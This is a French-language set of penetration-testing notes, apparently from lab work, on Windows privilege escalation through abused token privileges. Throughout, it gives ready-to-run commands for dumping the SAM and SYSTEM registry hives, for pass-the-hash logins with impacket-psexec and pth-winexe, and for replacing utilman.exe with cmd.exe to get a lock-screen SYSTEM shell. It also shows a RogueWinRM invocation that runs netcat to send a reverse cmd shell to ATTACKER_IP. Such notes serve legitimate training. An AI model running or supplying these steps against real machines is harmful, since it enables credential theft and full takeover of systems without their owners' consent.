Vérifiés ses privilèges :

```c
whoami /priv
```

Vous pouvez trouver une liste complètedes privilèges exploitables sur : [Priv2Admin](https://github.com/gtworek/Priv2Admin)


# SeBackup / SeRestore
Permettent aux utilisateurs de lire et d'écrire dans n'importe quel fichier du système, en ignorant toute DACL en place

Disposant de ce pouvoir, un attaquant peut élever de manière triviale les privilèges sur le système en utilisant de nombreuses techniques. Comme dumper SAM et SYSTEM pour extraire le hachage du mot de passe de l'administrateur local.


```c
reg save hklm\system C:\Users\THMBackup\system.bak
reg save hklm\sam C:\Users\THMBackup\sam.bak
```

Suivre [[Post Exploitation/Data Exfiltration/Windows#SMB|Windows Data Exfiltration - SMB]] pour telecharger les fichier `.bak`

Nous pouvons enfin utiliser le hachage de l'administrateur pour effectuer une attaque Pass-the-Hash et accéder à la machine cible avec les privilèges SYSTEM :

```sh
impacket-psexec -hashes LM_HASH:NT_HASH administrator@10.10.71.216
```

```
pth-winexe -U 'administrator%LMHASH:NTHASH' //@TARGET_IP cmd.exe
```


# SeTakeOwnership
Permet à un utilisateur de s'approprier n'importe quel objet du système, y compris les fichiers et les clés de registre

Nous allons abuser `utilman.exe`pour élever les privilèges. Utilman est une application Windows intégrée utilisée pour fournir des options de facilité d'accès pendant l'écran de verrouillage.

Pour remplacer utilman, on va commencer par s'en approprier :

```c
takeown /f C:\Windows\System32\Utilman.exe
```

Donner à l'utilisateur toutes les autorisations sur `utilman.exe` :

```c
icacls C:\Windows\System32\Utilman.exe /grant {USERNAME}:F
```

Après cela, nous remplacerons utilman.exe par une copie de cmd.exe :

```c
cd C:\Windows\System32\
copy cmd.exe utilman.exe
```

Pour déclencher utilman, :
- Verrouiller l'écran depuis le bouton démarrer
- cliquez sur le bouton "Ease of Access (Option d'ergonomie)"


# SeImpersonate / SeAssignPrimaryToken
Permettent à un processus de se faire passer pour d'autres utilisateurs et d'agir en leur nom. L'usurpation d'identité consiste à pouvoir générer un processus ou un thread dans le contexte de sécurité d'un autre utilisateur.

Si nous parvenons à prendre le contrôle d'un processus avec les privilèges `SeImpersonate` ou `SeAssignPrimaryToken`, nous pouvons usurper l'identité de n'importe quel utilisateur se connectant et s'authentifiant à ce processus.

Pour élever ses privilèges à l'aide de tels comptes, un attaquant a besoin des éléments suivants : 

1. Générer un processus afin que les utilisateurs puissent s'y connecter et s'y authentifier pour que l'usurpation d'identité se produise. 

2. Trouvez un moyen de forcer les utilisateurs privilégiés à se connecter et à s'authentifier auprès du processus malveillant généré.

> Si, pour une raison quelconque, le service WinRM ne s'exécute pas sur le serveur victime, un attaquant peut démarrer un faux service WinRM sur le port 5985 et intercepter la tentative d'authentification effectuée par le service BITS au démarrage

Si l'attaquant dispose des privilèges SeImpersonate, il peut exécuter n'importe quelle commande au nom de l'utilisateur qui se connecte, qui est SYSTEM.

1. Démarrer un écouteur netcat pour recevoir un shell inversé
2. Exécuter l'exploit

```sh
c:\Temp\RogueWinRM.exe -p "C:\Temp\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

[Exploit RogueWinRM](https://github.com/antonioCoco/RogueWinRM)


Ou utiliser le module `incognito` de metasploit qui va nous permettre d'exploiter cette vulnérabilité. 

